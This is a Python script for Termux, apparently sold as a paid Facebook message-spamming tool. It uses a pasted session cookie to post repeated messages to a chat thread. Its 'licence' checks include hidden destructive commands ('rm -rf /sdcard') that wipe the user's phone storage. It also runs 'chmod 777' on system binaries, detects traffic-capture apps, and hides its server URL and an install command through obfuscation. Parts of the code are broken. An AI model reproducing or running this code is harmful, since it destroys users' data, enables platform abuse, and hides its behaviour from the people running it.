import os,sys, requests, re, random, time
from os import system as psl
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as bsn
from os import path
from os import path,system
from platform import uname
from requests import api
xyz = '3JDB20M|JEI2920MDO-2N013463365==FARAZ'
# Modules

#os.system("pip uninstall urllib3 requests chardet idna certifi -y")
#os.system("pip install urllib3 requests chardet idna certifi")
#os.system("chmod 777 /data/data/com.termux/files/usr/bin/*")
#Securuty
arch=uname().machine.lower()
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    pass
else:
    os.system("clear")
    logo()
    print(f"\t [NOTE]")
    linex()
    print(f" JAWN VPROTECTOR OFF KRO NA NI URY GA DATA APKA ☺")
#----[http-capture]----
try:
        H = "ar"
        A="tt"
        M ="p"
        I ="o"
        fileee = os.listdir('/sdcard/Android/data/')
        if f'com.h{A}pcan{H}y.{M}r{I}' in fileee:
                print('We are Facing some errors ')
                #exit()
                #exit(f'\nsomethiiing went wrong\n\nContact Admin : +923155912839')
except Exception as e:
        print(e)
        pass
except PermissionError:
        pass
#MODULE_KILLER
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    exit()
elif "sys.stdout.write" in x:
    exit()
else:
    pass
from requests import sessions
x = open(sessions.__file__,'r').read()
if "print" in x:
    exit()
elif "sys.stdout.write" in x:
    exit()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    exit()
elif "sys.stdout.write" in x:
    exit()
else:
    pass
try:
    import mechanize
except:
    os.system(base64.b64decode(base64.b64decode("Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=")))


psl('rm -rf filer.txt')
idd = []
def logo():
    print("""\x1b[1;97m
 _   _ _   _ _   _ _____ _____ ____  
| | | | | | | \ | |_   _| ____|  _ \ 
| |_| | | | |  \| | | | |  _| | |_) |
|  _  | |_| | |\  | | | | |___|  _ < 
|_| |_|\___/|_| \_| |_| |_____|_| \_\                                                                         
-------------------------------------------
\033[;37m\033[;37mAuthor     :          Faraz Ali X H9SS9N X Hunter Boy
\033[;37m\033[;37mGithub     :          Nothing 
\033[;37m\033[;37mVersion    :          0.0.1
\033[;37m\033[;37mTool Type  :          Conv/inbox
\033[;37m-------------------------------------------""")
    
def main():
    psl('clear')
    logo()
    print('\x1b[1;97m  Put >> Cookies, Link id, Limit, File ')
    print('-------------------------------------------')
    coki = input(' [+] Cookies : ')
    cookies={'cookie': coki}
    ch = requests.get('https://mbasic.facebook.com/', cookies=cookies)
    if 'mbasic_logout_button' in ch.text:
        pass
    else:
        print(' \x1b[1;91mYour Account is on Checkpoint !!! \x1b[1;97m')
        os.sys.exit()
    print(' \x1b[1;92m Account Logged in Successfully\x1b[1;97m ')
    print('-------------------------------------------')
    delay = int(input(' [+] Delay : '))
    print('-------------------------------------------')
    lnk = input(' [+] Link id : ')
    print('-------------------------------------------')
    lim = int(input(' [+] Repeat : '))
    print('-------------------------------------------')
    filee = input(' [+] File : ')
    fileee = open(filee,'r').read()
    cpy(fileee,lim)
    file = open('filer.txt','r').readlines()
    idd.append(file)
    with bsn(max_workers=30) as crack:
        psl('clear')
        logo()
        print('')
        print(' \033[1;97m[+] Total messages : %s' %(len(file)))
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        for mess in idd:
            sm = '1'
            if sm == '1':
                crack.submit(msg,mess,coki,lnk)
        os.sys.exit()
def msg(mess,coki,lnk):
    try:
        ses = requests.Session()
        for msgs in mess:
            cookies={'cookie': coki}
            g_url = 'https://mbasic.facebook.com/messages/read/?tid='+lnk
            g_headers = {
                'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'referer': 'https://mbasic.facebook.com/messages/read/?tid='+lnk,
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-full-version-list': '" Not A;Brand";v="99.0.0.0", "Chromium";v="101.0.4951.40"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
            }
            res1 = requests.get(url=g_url, cookies=cookies, headers=g_headers).text
            j2 = re.search(
                r'name="jazoest" value="([^"]+)"',
                res1
            ).group(1)
        
            fb_dtsg = re.search(
                r'name="fb_dtsg" value="([^"]+)"',
                res1
            ).group(1)
        
            csid = re.search(
                r'name="csid" value="([^"]+)"',
                res1
            ).group(1)
        
            tids = re.search(
                r'name="tids" value="([^"]+)"',
                res1
            ).group(1)
            
            ses.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
            })
            
            rose1 = sop(res1, 'html.parser')
            rose = rose1.find('form',method='post')['action']
            payload = {
                'fb_dtsg': fb_dtsg,
                'jazoest': j2,
                'body': str(msgs),
                'send': 'Send',
                'tids': tids,
                'wwwupp': 'C3',
                'platform_xmd': '',
                'referrer': '',
                'ctype': '',
                'cver': 'legacy',
                'csid': csid
            }
            host = 'https://mbasic.facebook.com'
            post = ses.post(url=host+rose, data=payload, cookies=cookies).text
            print(' \x1b[1;97m Message Send Successfully >>\x1b[1;92m ' +msgs+'\x1b[1;97m')
        loop+=1
    except Exception as e:
        print(e)
   
def cpy(fileee,lim):
    for i in range(lim):
        open('filer.txt','a').write(fileee+'\n')
       


import os,sys,datetime,re,requests,time,uuid
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
#clear()
print(f" installing modules \n \n \n ")
os.system("pip uninstall urllib3 requests chardet idna certifi -y")
os.system("pip install urllib3 requests chardet idna certifi")
os.system("chmod 777 /data/data/com.termux/files/usr/bin/*")


#print(f"{BLUE} PUT YOUR NAME ")
#NameX =input('\x1b[38;5;46m [+] \x1b[38;5;46mWHAT IS YOUR NAME : ')


#=====================Raw
ID = ['h','t','t','p','s',':','/','/','r','a','w','.','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.','c','o','m','/','M','h','k','i','n','g','8','9','7','/','F','-','8','/','m','a','i','n','/','A','p','p','r','o','v','e','l','.','t','x','t']
XDI = ''.join(ID)

def my_tool_security():
    #clear()
    try:
        token_one=open("/sdcard/Android/.bra.txt",'r').read()
    except(requests.exceptions.ConnectionError):
        print(f" {RED}please on internet wifi/data ")
        exit()
    except(FileNotFoundError):
        os.system('termux-setup-storage') 
        print("\t\n WELCOME TO FARAZ TOOL....")
        time.sleep(2)
        iid_1=uuid.uuid1().hex[:7].upper()
        iid_2=uuid.uuid1().hex[:7].upper()
        open("/sdcard/Android/.bra.txt",'w').write(iid_1)
        open("/sdcard/Android/.bra.txt",'w').write(iid_2)
        my_tool_security()
    except(KeyError,OSError,IOError):
        os.system("termux-setup-storage")
        print("\n Hey user we are facing issues with your device")
        print(" Give termux storage permission and try again")
        exit()
    token_two=open("/sdcard/Android/.bra.txt",'r').read()
    if len(token_two)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        exit()
    else:
        pass
    if len(token_one)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        exit()
    else:
        pass
    if len(token_two)>=8:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        exit()
    else:
        f_token=token_one+token_two
    my_server=requests.get(f"{XDI}").text
    if f_token in my_server:
        faraz()
    else:
        _help=uuid.uuid1().hex[:6].upper()+"=FARAZ="
        print("\n\t       [ Hello User ]\n")


#clear()
try:
    token_one=open("/sdcard/Android/.bra.txt",'r').read()
except(requests.exceptions.ConnectionError):
    print(f" {RED}please on internet wifi/data ")
    exit()
except(FileNotFoundError):
    os.system('termux-setup-storage') 
    print("\t\n WELCOME TO FARAZI TOOL....")
    time.sleep(2)
    iid_1=uuid.uuid1().hex[:7].upper()
    iid_2=uuid.uuid1().hex[:7].upper()
    open("/sdcard/Android/.bra.txt",'w').write(iid_1)
    open("/sdcard/Android/.bra.txt",'w').write(iid_2)
    my_tool_security()
except(KeyError,OSError,IOError):
    os.system("termux-setup-storage")
    print("\n Hey user we are facing issues with your device")
    print(" Give termux storage permission and try again")
    exit()
token_two=open("/sdcard/Android/.bra.txt",'r').read()
if len(token_two)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_one)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_two)>=8:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    f_token=token_one+token_two
my_server=requests.get(f"{XDI}").text
if f_token in my_server:
    main()
else:
    _help=uuid.uuid1().hex[:6].upper()+"=FARAZ="
  #  print("\n\t       [ Hello User ]")
try:
    token_one=open("/sdcard/Android/.bra.txt",'r').read()
except(requests.exceptions.ConnectionError):
    print(f" {RED}please on internet wifi/data ")
    exit()
except(FileNotFoundError):
    os.system('termux-setup-storage')
    print("\t\n WELCOME TO FARAZ TOOL....")
    time.sleep(2)
    iid_1=uuid.uuid1().hex[:7].upper()
    iid_2=uuid.uuid1().hex[:7].upper()
    open("/sdcard/Android/data/.bra.txt",'w').write(iid_1)
    open("/sdcard/Android/data/.bra.txt",'w').write(iid_2)
    my_tool_security()
except(KeyError,OSError,IOError):
    os.system("termux-setup-storage")
    print("\n Hey user we are facing issues with your device")
    print(" Give termux storage permission and try again")
    exit()
token_two=open("/sdcard/Android/.bra.txt",'r').read()
if len(token_two)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_one)<=1:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    pass
if len(token_two)>=8:
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard")
    exit()
else:
    f_token=token_one+token_two
my_server=requests.get(f"{XDI}").text

if f_token in my_server:
    main()
else:
    _help=uuid.uuid1().hex[:6].upper()+"=FARAZ="
    os.system("clear")
    
    logo()
    
    print(f" Your Device License Key Is Not Approved")
    print("-------------------------------------------")
    print(f" {RED} Copy your Key :",f_token+xyz+"\n")
    #print(f" {RED} Copy your Key :",f_token,"")
    print("\033[1;97m-------------------------------------------")    
    print("Note : Baray Mehrbani Tool Apni Zimadare se Buy Kary Lehaza May Apko Force Ni Kar Raha Baqe Tool Har 2 sy 3 din bad update hjyaa kryga ")
    print("-------------------------------------------")
   # print(f" 15-Days Price : 350")
   # print(f" 1-Month Price : 500")
   # print("-------------------------------------------")
    input("[Press Enter To Send Key To Admin]")
    os.system("xdg-open https://wa.me/923272458382")
    os.system("xdg-open https://wa.me/923272458382")
    
 #   os.system('xdg-open  https://wa.me/+1(703)249-6106')
    print("-------------------------------------------")
    print(" Hehe String Bypaser Faraz here ")
   # print("\n\t         \x1b[97m[\033[37;41m YOUR KEY \033[0;m] \n")
    #print(f" {RED} Copy your Key :",f_token+_help,"\n")
   # os.system('xdg-open  https://wa.me/+923132281952?text=*ASALAMUALIKUM*%2C%20*SIR-FARAZ*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*VIP*%20*CAMMANDS*%20%20*My*%20*Key*%20*:*%20'+f_token+_help)
    exit()


main()